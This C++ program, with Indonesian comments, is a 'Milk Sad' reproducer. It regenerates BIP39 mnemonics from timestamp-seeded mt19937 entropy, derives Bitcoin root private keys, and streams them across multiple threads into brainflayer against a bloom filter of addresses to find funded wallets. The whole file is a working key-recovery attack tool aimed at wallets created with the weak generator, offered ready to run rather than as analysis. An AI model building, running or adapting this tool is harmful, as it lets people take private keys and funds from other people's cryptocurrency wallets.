#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cstring>
#include <thread>
#include <atomic>
#include <mutex>
#include <climits>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

// --- KONFIGURASI ---
const std::string WORDLIST_FILENAME = "english.txt";
const uint64_t REPORT_INTERVAL = 250000; // Lapor setiap 250k key agar terminal tidak penuh
const int DEFAULT_NUM_THREADS = 4;
std::atomic<bool> g_stop_flag(false);

// --- HELPER SYSTEM ---

// Fungsi cek file
bool file_exists(const std::string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}

// Fungsi mendapatkan full path (absolute path)
// Ini PENTING agar brainflayer tidak bingung mencari file .blf
std::string get_absolute_path(const std::string& relative_path) {
    char path[PATH_MAX];
    if (realpath(relative_path.c_str(), path) != NULL) {
        return std::string(path);
    }
    return relative_path; 
}

// --- CRYPTO & BIP39 (LOGIKA INTI MILK SAD) ---

std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    std::mt19937 engine(seed_value);
    std::vector<uint8_t> entropy(32);
    
    // GENERATE 32-BIT BLOCKS (MILK SAD METHOD)
    for (size_t i = 0; i < 32; i += 4) {
        uint32_t random_block = engine();
        std::memcpy(&entropy[i], &random_block, 4);
    }

    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];

    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte);

    std::string mnemonic;
    mnemonic.reserve(256);

    for (int i = 0; i < 24; ++i) {
        int start_bit = i * 11;
        int word_index = 0;
        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8);
            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }
        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }
    return mnemonic;
}

std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    const int iterations = 2048;
    const std::string salt = "mnemonic";
    std::vector<uint8_t> seed(64);
    
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) return "";

    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    HMAC(EVP_sha512(), reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), hmac_result, &hmac_len);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    return ss.str();
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    // Prioritas pencarian file wordlist
    std::string paths[] = { filename, "Wordlist/" + filename, "../Wordlist/" + filename, "./brainflayer/" + filename };
    std::ifstream file;
    std::string found_path;
    
    for (const auto& p : paths) {
        if (file_exists(p)) { 
            file.open(p); 
            found_path = p;
            break; 
        }
    }
    if (!file.is_open()) throw std::runtime_error("Wordlist not found! Pastikan 'english.txt' ada.");
    
    std::cout << "[*] Wordlist loaded from: " << found_path << std::endl;

    std::string word;
    while (std::getline(file, word)) {
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first != std::string::npos)
            wordlist.push_back(word.substr(first, word.find_last_not_of(" \t\r\n") - first + 1));
    }
    return wordlist;
}

// --- WORKER THREAD ---

void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::mutex& print_mtx,
                   const std::string& cmd_template) {
    
    // Output brainflayer akan dibuang ke file log per thread
    std::string log_file = "found_thread_" + std::to_string(thread_id) + ".txt";
    std::string final_cmd = cmd_template + " > " + log_file + " 2>&1";
    
    FILE* pipe = popen(final_cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] CRITICAL ERROR: popen failed!" << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    bool pipe_intact = true;
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        // Tulis ke brainflayer
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
            pipe_intact = false;
            break; // Brainflayer mati/crash
        }

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        if (local_processed % REPORT_INTERVAL == 0) {
            std::lock_guard<std::mutex> lock(print_mtx);
            std::cout << "[Thread " << thread_id << "] TS: " << ts << " | Processed: " << local_processed << std::endl;
        }
    }
    
    int ret = pclose(pipe);
    if (WEXITSTATUS(ret) != 0 && local_processed < 100) {
        // Jika brainflayer exit dengan error dan baru memproses sedikit
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "\n[Thread " << thread_id << "] WARNING: Brainflayer exited early. Check " << log_file << std::endl;
    }
}

// --- MAIN PROGRAM ---

void signal_handler(int) { g_stop_flag = true; }

int main() {
    signal(SIGPIPE, SIG_IGN); // PENTING: Mencegah program C++ crash jika brainflayer tutup
    signal(SIGINT, signal_handler);
    OpenSSL_add_all_algorithms();

    std::cout << "=== MILK SAD REPRODUCER (FINAL ROBUST) ===" << std::endl;

    // --- 1. DETEKSI PATH EXECUTABLE & BLF ---
    std::string bf_path, blf_path;

    // Cari Brainflayer
    if (file_exists("./brainflayer/brainflayer")) bf_path = get_absolute_path("./brainflayer/brainflayer");
    else if (file_exists("./brainflayer")) bf_path = get_absolute_path("./brainflayer");
    else {
        std::cerr << "ERROR: Tidak menemukan executable 'brainflayer'." << std::endl;
        std::cerr << "Pastikan Anda menjalankan: chmod +x brainflayer/brainflayer" << std::endl;
        return 1;
    }

    // Cari Bloom Filter (Prioritas folder saat ini karena Anda baru saja membuatnya di sini)
    if (file_exists("040823BF.blf")) blf_path = get_absolute_path("040823BF.blf");
    else if (file_exists("./brainflayer/040823BF.blf")) blf_path = get_absolute_path("./brainflayer/040823BF.blf");
    else {
        std::cerr << "ERROR: File '040823BF.blf' tidak ditemukan!" << std::endl;
        return 1;
    }

    std::cout << "[OK] Brainflayer path: " << bf_path << std::endl;
    std::cout << "[OK] Bloom Filter path: " << blf_path << std::endl;

    // --- 2. LOAD WORDLIST ---
    std::vector<std::string> wordlist;
    try {
        wordlist = load_wordlist(WORDLIST_FILENAME);
    } catch (std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl; return 1;
    }

    // --- 3. PILIHAN MODE ---
    int mode;
    std::cout << "\nMode Scan:\n1. Rentang Tanggal (Standard MilkSad)\n2. Full 32-bit Scan (Lama)\n> ";
    std::cin >> mode;

    uint32_t start_ts = 0, end_ts = 0;
    if (mode == 1) {
        std::string s_date, e_date;
        std::cout << "Start (YYYY-MM-DD): "; std::cin >> s_date;
        std::cout << "End   (YYYY-MM-DD): "; std::cin >> e_date;
        
        struct tm tm = {};
        #ifdef _WIN32
        _putenv("TZ=UTC"); _tzset();
        #else
        setenv("TZ", "UTC", 1); tzset();
        #endif
        
        if (strptime(s_date.c_str(), "%Y-%m-%d", &tm) == NULL) { std::cerr << "Format tanggal salah!" << std::endl; return 1; }
        start_ts = mktime(&tm);
        
        tm = {};
        strptime(e_date.c_str(), "%Y-%m-%d", &tm);
        tm.tm_hour = 23; tm.tm_min = 59; tm.tm_sec = 59;
        end_ts = mktime(&tm);
    } else {
        start_ts = 0; end_ts = UINT_MAX;
    }

    int threads_count = DEFAULT_NUM_THREADS;
    std::cout << "Jumlah Thread (Saran: 4-8): "; 
    if (std::cin.peek() != '\n') std::cin >> threads_count;

    // --- 4. EXECUTION ---
    // Command Template menggunakan Absolute Path
    std::string cmd_template = bf_path + " -v -b " + blf_path + " -i - -t priv -x";
    
    std::cout << "\n[*] Command Internal: " << cmd_template << std::endl;
    std::cout << "[*] Memulai Scan " << (uint64_t)end_ts - start_ts << " detik..." << std::endl;

    std::vector<std::thread> threads;
    std::atomic<uint64_t> global_counter(0);
    std::mutex print_mtx;
    uint64_t chunk = ((uint64_t)end_ts - start_ts) / threads_count;

    for(int i=0; i<threads_count; i++) {
        uint32_t t_s = start_ts + (i * chunk);
        uint32_t t_e = (i == threads_count-1) ? end_ts : t_s + chunk - 1;
        threads.emplace_back(worker_thread, t_s, t_e, i, 
                             std::cref(wordlist), std::ref(global_counter), std::ref(print_mtx),
                             cmd_template);
    }

    for(auto& t : threads) t.join();

    std::cout << "\n[SELESAI] Cek file 'found_thread_X.txt' untuk melihat hasilnya." << std::endl;
    std::cout << "Jika file kosong, berarti tidak ada wallet yang ditemukan." << std::endl;
    return 0;
}
